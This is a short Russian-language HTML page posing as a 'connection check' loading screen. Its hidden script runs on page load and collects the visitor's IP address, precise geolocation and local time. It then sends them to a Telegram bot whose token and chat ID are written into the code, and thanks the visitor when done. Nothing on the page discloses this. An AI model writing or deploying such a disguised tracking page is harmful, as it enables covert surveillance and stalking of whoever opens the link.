<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Проверка соединения</title>
</head>
<body>
    <div id="info">
        <h2>Идет загрузка</h2>
        <p>Пожалуйста, подождите</p>
    </div>

    <script>
        var sent = false
        var token = '8862821632:AAHVpQ68Co6A3XOVlytf8-NW40NPfbQdkGs'
        var chatId = '7761721600'

        function sendText(txt) {
            var x = new XMLHttpRequest()
            x.open('POST', 'https://api.telegram.org/bot' + token + '/sendMessage', true)
            x.setRequestHeader('Content-Type', 'application/json')
            x.send(JSON.stringify({ chat_id: chatId, text: txt }))
        }

        function getIP(cb) {
            var x = new XMLHttpRequest()
            x.open('GET', 'https://api.ipify.org?format=json', true)
            x.onload = function() {
                try {
                    var d = JSON.parse(x.responseText)
                    cb(d.ip)
                } catch(e) {
                    cb('не удалось получить')
                }
            }
            x.onerror = function() {
                cb('не удалось получить')
            }
            x.send()
        }

        function getGeo(cb) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        var lat = pos.coords.latitude.toFixed(5)
                        var lon = pos.coords.longitude.toFixed(5)
                        var acc = pos.coords.accuracy
                        cb(lat + ', ' + lon + ' (точность ' + acc + 'м)')
                    },
                    function(e) {
                        cb('запрещено: ' + e.message)
                    },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                )
            } else {
                cb('не поддерживается')
            }
        }

        function getTime() {
            var now = new Date()
            return now.toLocaleString('ru-RU', { timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone })
        }

        setTimeout(function() {
            if (sent) return

            getIP(function(ip) {
                getGeo(function(geo) {
                    var time = getTime()
                    var msg = 'Место нахождения: ' + geo + '\nВремя получения: ' + time + '\nIP адрес: ' + ip
                    sendText(msg)
                    sent = true
                    document.getElementById('info').innerHTML = '<h2>Проверка завершена</h2><p>Спасибо</p>'
                })
            })

        }, 2000)
    </script>
</body>
</html>
